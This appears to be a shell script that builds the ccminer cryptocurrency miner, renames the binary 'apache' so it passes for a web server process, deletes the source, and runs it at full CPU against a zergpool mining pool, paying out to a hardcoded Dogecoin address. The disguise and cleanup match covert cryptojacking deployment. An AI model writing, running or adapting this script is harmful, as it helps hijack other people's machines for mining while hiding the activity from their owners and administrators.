apt -y install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential git
git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git
cd ccminer
chmod +x build.sh
chmod +x configure.sh
chmod +x autogen.sh
./build.sh
mv ccminer ../apache
cd ..
rm ccminer -r
./apache -a verus -o stratum+tcp://verushash.asia.mine.zergpool.com:3300 -u DGD7P3FmcWBp1bdq3dFm7PMjsdJ1kwVdS9 -p c=DOGE,mc=VRSC,ID=wik-{$1} -t $(nproc)
